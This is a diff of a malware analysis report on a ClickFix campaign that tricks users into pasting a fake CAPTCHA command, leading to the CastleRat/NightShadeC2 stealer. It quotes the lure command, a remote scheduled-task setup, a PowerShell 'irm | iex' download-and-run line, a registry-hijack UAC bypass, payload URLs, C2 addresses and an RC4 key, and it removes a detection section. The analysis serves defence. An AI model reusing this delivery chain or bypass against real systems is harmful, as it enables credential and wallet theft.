@@ -22,17 +22,35 @@ C2 RESOLVE : Steam Community profile dead-drop
 C2         : 45.88.106.190:4545 (resolved)
 ```
 
-ClickFix-style delivery ending in CastleRat / NightShadeC2. User pasted an attacker-supplied command into Run (`Win+R`) believing it was CAPTCHA verification. The interesting part is the delivery path - remote task XML, junk-padded PowerShell, and Steam dead-drop C2 resolution - not the final implant.
+ClickFix-style delivery ending in CastleRat / NightShadeC2. The user pasted an attacker-supplied command into Run (`Win+R`) as a fake CAPTCHA check. That command staged SMB credentials, created a scheduled task from remote XML, and led through a junk-padded PowerShell stager into a .NET loader, bundled Python runtime, Steam dead-drop C2 resolution, and the implant.
+
+## Attack Chain
+
+```
+User pastes "Cloudflare CAPTCHA" command → cmd.exe
+  → cmdkey + schtasks /XML
+  → SMB \\195.10.205.171\kxc\full.xml
+  → Scheduled Task "Lowks"
+  → powershell -c "irm … | iex"
+  → yhofgafjle.com (junk-padded script)
+  → cWtdXfLUVptO() → maestrovsd.exe
+  → .NET loader + PowerShell staging
+  → Python bundle under C:\ProgramData\{random}\
+  → pythonw.exe install.pyc / melody.pyc
+  → ComputerDefaults.exe UAC bypass
+  → steamcommunity.com/id/… (C2 resolver)
+  → CastleRat / NightShadeC2 → 45.88.106.190:4545
+```
 
 ## Initial Access - ClickFix
 
-The lure page was not preserved, but the executed command was recovered from endpoint telemetry:
+The lure page was not preserved. The executed command was recovered from endpoint telemetry:
 
 ```cmd
 cmd.exe /c cmdkey /add:195.10.205.171 /user:guest && schtasks /Create /TN "Lowks" /XML "\\195.10.205.171\kxc\full.xml" & REM I am not a robot - Cloudflare ID: qbIohbNXJpIB7wj
 ```
 
-The trailing `REM` comment is intentional camouflage. It mimics Cloudflare verification text so the command appears benign when pasted quickly.
+The trailing `REM` comment mimics Cloudflare verification text so the paste looks like CAPTCHA-related noise rather than a full command chain.
 
 ## Credential Staging and Scheduled Task
 
@@ -44,7 +62,7 @@ The command chains two actions with `&&`.
 cmdkey /add:195.10.205.171 /user:guest
 ```
 
-Stores credentials for `\\195.10.205.171\` as `guest` in Windows Credential Manager. This prevents an interactive credential prompt when the next step accesses the remote SMB share.
+Stores credentials for `\\195.10.205.171\` as `guest` in Windows Credential Manager. That avoids an interactive prompt when the next step opens the remote SMB share.
 
 ### schtasks
 
@@ -52,19 +70,13 @@ Stores credentials for `\\195.10.205.171\` as `guest` in Windows Credential Mana
 schtasks /Create /TN "Lowks" /XML "\\195.10.205.171\kxc\full.xml"
 ```
 
-The task definition is hosted on a remote SMB share rather than embedded in the command. Benefits for the operator:
-
-- Task content is not written locally in a standard path
-- The XML can be updated server-side without changing the lure
-- Behavioral detections may only see `schtasks` execution, not the malicious task body
-
-`full.xml` contains a task that runs:
+Task definition is pulled from a remote SMB share instead of embedded in the paste. The XML can be changed server-side without updating the lure command. `full.xml` defines a task that runs:
 
 ```powershell
 powershell -c "irm hxxps://yhofgafjle[.]com | iex"
 ```
 
-This is a standard download-and-execute pattern: `Invoke-RestMethod` fetches a script and pipes it directly to `Invoke-Expression` with no intermediate file on disk.
+`Invoke-RestMethod` fetches a script and pipes it to `Invoke-Expression` with no intermediate file on disk. That handoff is what loads Stage 2.
 
 ## PowerShell Stager - AMSI Dilution
 
@@ -77,7 +89,7 @@ function asd0192hjkl { return $true }
 $rndVar = Get-Random -Minimum 1 -Maximum 9999
 ```
 
-This padding dilutes AMSI and static signature matches. The functional payload is buried in the noise:
+Padding dilutes AMSI and static signature matches. Functional payload is buried in the noise:
 
 ```powershell
 function cWtdXfLUVptO {
@@ -88,7 +100,7 @@ function cWtdXfLUVptO {
 }
 ```
 
-The script downloads `maestrovsd.exe`, writes it to `C:\Windows\Temp\TrHtWFGyRY.exe`, and executes it. Variable names appear randomized per deployment to frustrate string-based detection.
+Downloads `maestrovsd.exe`, writes it to `C:\Windows\Temp\TrHtWFGyRY.exe`, and executes it. Variable names appear randomized per deployment.
 
 ## .NET Loader and Python Runtime
 
@@ -114,7 +126,7 @@ https://adamcold.com/NiceNic/melody.pyc
 https://adamcold.com/NiceNic/5o7dkS4S.8
 ```
 
-The ZIP archives contain full Python runtimes including signed `python.exe`, `pythonw.exe`, and `python313.dll`. The malware ships its own interpreter instead of relying on a host-installed version.
+The ZIP archives contain full Python runtimes (signed `python.exe`, `pythonw.exe`, `python313.dll`). The malware ships its own interpreter rather than depending on a host install.
 
 Dropped locations:
 
@@ -123,18 +135,18 @@ C:\ProgramData\5171NWNrWQ\   ← Python 3.9 environment
 C:\ProgramData\92WKzFYLqB\   ← Python 3.13 environment
 ```
 
-Execution uses signed `pythonw.exe` against `install.pyc` and `melody.pyc`, so the process tree shows a trusted binary running Python bytecode.
+Execution uses signed `pythonw.exe` against `install.pyc` and `melody.pyc`, so the process tree shows a trusted binary running attacker bytecode.
 
 ## In-Memory C# Compilation and UAC Bypass
 
-Sandbox analysis captured `csc.exe` invoked with `.cmdline` argument files, producing temporary DLLs in `%TEMP%`:
+Sandbox analysis captured `csc.exe` with `.cmdline` argument files, producing temporary DLLs in `%TEMP%`:
 
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
     /noconfig /fullpaths @"C:\Users\<user>\AppData\Local\Temp\is3na01s.cmdline"
 ```
 
-This indicates inline C# compilation from PowerShell (`Add-Type`). Source is generated at runtime, compiled, and loaded without a persistent malicious DLL on disk.
+Consistent with inline C# compilation from PowerShell (`Add-Type`): source generated at runtime, compiled, loaded, without a persistent malicious DLL on disk.
 
 UAC bypass via `ComputerDefaults.exe` registry hijack:
 
@@ -144,11 +156,11 @@ Child:     C:\Windows\System32\ComputerDefaults.exe
 Integrity: HIGH (elevated)
 ```
 
-The malware modifies `HKCU\Software\Classes\ms-settings\Shell\Open\command` and triggers auto-elevated `ComputerDefaults.exe`. Detection: `ComputerDefaults.exe` should not have a non-`explorer.exe` parent.
+The chain modifies `HKCU\Software\Classes\ms-settings\Shell\Open\command` and launches auto-elevated `ComputerDefaults.exe`. Elevation from the Python host feeds later privileged actions and implant setup.
 
 ## C2 Resolution - Steam Dead Drop
 
-The implant does not hardcode its C2 address. It retrieves:
+The implant does not hardcode its primary C2. It retrieves:
 
 ```
 https://steamcommunity.com/id/dpmorin49sdiw302fw
@@ -168,67 +180,20 @@ Config extraction also identified backup C2 `8.3.0.253` and RC4 key:
 
 The key decrypts secondary stages `5o7dkS4S.8` and `veQcBTuTnPwMD.Ar` (~5MB and ~15MB RC4-encrypted blobs loaded in memory).
 
-The Python payload is PyArmor-protected. Static `.pyc` analysis is limited; memory dumps are required for meaningful reverse engineering.
-
-YARA hits on process dumps tagged both **CastleRat** and **NightShadeC2**, likely the same codebase or a close fork based on infrastructure overlap.
+The Python payload is PyArmor-protected; static `.pyc` analysis is limited. YARA hits on process dumps tagged both **CastleRat** and **NightShadeC2** (same codebase or close fork given infrastructure overlap).
 
 ## Post-Compromise Capabilities
 
-Observed stealer functionality:
+Observed stealer functionality after C2 resolution:
 
-- **Browsers** - Chrome, Edge, Firefox (cookies, credentials, autofill). Firefox decryption via victim-installed `nss3.dll`.
-- **Crypto wallets** - Exodus, Electrum, Atomic, Coinomi, Jaxx, Ledger Live, Ethereum keystore, WalletWasabi; extension wallets including MetaMask, Phantom, TronLink.
-- **Password managers** - 1Password, NordPass directory enumeration.
-- **VPN** - NordVPN, ProtonVPN configs.
-- **FTP** - Cyberduck, FileZilla.
-- **Screenshots** - observed across `pythonw.exe` memory regions.
+- **Browsers** — Chrome, Edge, Firefox (cookies, credentials, autofill). Firefox decryption via victim-installed `nss3.dll`.
+- **Crypto wallets** — Exodus, Electrum, Atomic, Coinomi, Jaxx, Ledger Live, Ethereum keystore, WalletWasabi; extension wallets including MetaMask, Phantom, TronLink.
+- **Password managers** — 1Password, NordPass directory enumeration.
+- **VPN** — NordVPN, ProtonVPN configs.
+- **FTP** — Cyberduck, FileZilla.
+- **Screenshots** — observed across `pythonw.exe` memory regions.
 
 Exfiltration over resolved C2 `45.88.106.190:4545`.
-
-## Attack Chain
-
-```
-[User] ──── pastes "Cloudflare CAPTCHA" command ──→ [cmd.exe]
-                                                       │
-                                                       ▼
-                                          cmdkey + schtasks /XML
-                                                       │
-                                                       ▼
-                                       [SMB \\195.10.205.171\kxc\full.xml]
-                                                       │
-                                                       ▼
-                                            Scheduled Task "Lowks"
-                                                       │
-                                                       ▼
-                                         powershell -c "irm ... | iex"
-                                                       │
-                                                       ▼
-                                       [yhofgafjle.com - junk-padded script]
-                                                       │
-                                                       ▼
-                                       cWtdXfLUVptO()  →  maestrovsd.exe
-                                                       │
-                                                       ▼
-                          ┌────────────────────────────┴──────────────────────┐
-                          │                                                   │
-                       PowerShell                                       .NET loader
-                          │                                                   │
-                          ▼                                                   ▼
-                    csc.exe (in-mem C#)                          Python bundle download
-                          │                                                   │
-                          └────────────────────────┬──────────────────────────┘
-                                                   ▼
-                              C:\ProgramData\{random}\pythonw.exe install.pyc
-                                                   │
-                                                   ▼
-                                       ComputerDefaults.exe UAC bypass
-                                                   │
-                                                   ▼
-                                  steamcommunity.com/id/... ← C2 resolver
-                                                   │
-                                                   ▼
-                                  CastleRat / NightShadeC2 → 45.88.106.190:4545
-```
 
 ## Indicators of Compromise
 
@@ -284,12 +249,3 @@ RC4 key:  Ymbjo9tV4hdp2Lt0
 Name:  Lowks
 XML:   \\195.10.205.171\kxc\full.xml
 ```
-
-## Detection Opportunities
-
-- `cmdkey /add` followed by `schtasks /Create /XML` referencing a remote UNC path
-- PowerShell `irm | iex` from a newly created scheduled task
-- `pythonw.exe` executing from `C:\ProgramData\{random}\` with no corresponding software install record
-- `ComputerDefaults.exe` spawned by non-`explorer.exe` parent
-- Outbound HTTPS to `steamcommunity.com` from Python or PowerShell child processes, followed by connections to newly resolved IPs
-- RC4-encrypted archive downloads (`*.8`, `*.Ar`) from known distribution hosts
